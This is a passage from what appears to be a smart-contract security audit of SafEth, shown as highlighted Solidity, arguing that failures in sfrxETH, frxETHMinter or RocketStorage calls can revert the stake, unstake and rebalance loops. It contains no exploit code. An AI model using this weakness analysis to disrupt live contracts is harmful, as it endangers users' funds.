&lt; </span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> +=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">:                 (</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">74</span><span class=\"mtk1\">:                     </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">75</span><span class=\"mtk1\">:                 </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">84</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">91</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">}();</span></span></span></code></pre>\n<p>In <code>unstake()</code>, each derivative is iterated to <code>withdraw()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SafEth</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SafEth</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">unstake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safEthAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">118</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivativeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">:         }</span></span></span></code></pre>\n<p>In <code>rebalanceToWeights()</code>, each derivative is iterated to <code>withdraw()</code> and then <code>deposit()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">rebalanceToWeights</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmountBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">141</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">() &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">142</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">143</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">147</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">148</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">weights</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">ethAmountToRebalance</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">149</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">ethAmountToRebalance</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">weights</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">150</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">totalWeight</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">151</span><span class=\"mtk1\">:             </span><span class=\"mtk3\">// Price will change due to slippage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">152</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">153</span><span class=\"mtk1\">:         }</span></span></span></code></pre>\n<p>For each of the current derivatives, there are several different scenarios where the <code>ethPerDerivative()/deposit()/withdraw()</code> could fail.</p>\n<p><strong>SfrxEth.sol</strong></p>\n<ul>\n<li><code>redeem()</code> could fail due to not enough allowance.</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SafEth</span><span class=\"mtk1\">/</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SfrxEth</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">61</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">IsFrxEth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">SFRX_ETH_ADDRESS</span><span class=\"mtk1\">).</span><span class=\"mtk11\">redeem</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">62</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">64</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">65</span><span class=\"mtk1\">:         );</span></span></span></code></pre>\n<p>Below is sFrxEth contract code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// https://etherscan.io/address/0xac3E018457B222d93114458476f3E3416Abbe38F</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// line 691-700</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">redeem</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allowed</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">allowance</span><span class=\"mtk1\">[</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">]; </span><span class=\"mtk3\">// Saves gas for limited approvals.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">allowed</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">) </span><span class=\"mtk12\">allowance</span><span class=\"mtk1\">[</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">allowed</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<ul>\n<li>FrxEthEthPool <code>exchange()</code> could fail due to <code>minOut</code> requirement.</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SafEth</span><span class=\"mtk1\">/</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SfrxEth</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">77</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">IFrxEthEthPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">FRX_ETH_CRV_POOL_ADDRESS</span><span class=\"mtk1\">).</span><span class=\"mtk11\">exchange</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">:             </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">79</span><span class=\"mtk1\">:             </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">80</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">frxEthBalance</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">81</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">minOut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">82</span><span class=\"mtk1\">:         );</span></span></span></code></pre>\n<ul>\n<li><code>deposit()</code> could fail because <code>submitAndDeposit()</code> -> <code>_submit()</code> can be paused.</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SafEth</span><span class=\"mtk1\">/</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SfrxEth</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">094</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">101:         </span><span class=\"mtk11\">frxETHMinterContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">submitAndDeposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p>Below is the frxETHMinter contract:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// https://etherscan.io/address/0xbAFA44EFE7901E04E39Dad13167D089C559c1138</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// frxETHMinter.sol: 70-101</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">submitAndDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_submit</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_submit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(!</span><span class=\"mtk12\">submitPaused</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Submit is paused&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>If <code>submitPaused</code> is turned on, this deposit function will revert.</p>\n<p><strong>Reth.sol</strong></p>\n<ul>\n<li><code>rethAddress()</code> and <code>getAddress()</code></li>\n</ul>\n<p><code>rethAddress()</code> is called in multiple places:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SafEth</span><span class=\"mtk1\">/</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Reth</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">rethAddress</span><span class=\"mtk1\">() </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">67</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">RocketStorageInterface</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ROCKET_STORAGE_ADDRESS</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">:                 </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">70</span><span class=\"mtk1\">:                     </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;rocketTokenRETH&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">:                 )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">:             );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>But it could return wrong address or <code>addr(0)</code>, since the referred <code>getAddress()</code> could return unexpected result. <code>addressStorage[_key]</code> can be reset or deleted. Then the whole function call will revert.</p>\n<p>Below is the RocketStorage.sol:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// https://etherscan.io/address/0x1d8f8f00cfa6758d7bE78336684788Fb0ee0Fa46</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// 179-181</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_key</span><span class=\"mtk1\">) </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">r</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addressStorage</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_key</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// 215-217</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_key</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_value</span><span class=\"mtk1\">) </span><span class=\"mtk11\">onlyLatestRocketNetworkContract</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">addressStorage</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_key</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_value</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// 251-253</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deleteAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_key</span><span class=\"mtk1\">) </span><span class=\"mtk11\">onlyLatestRocketNetworkContract</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">external</span><span 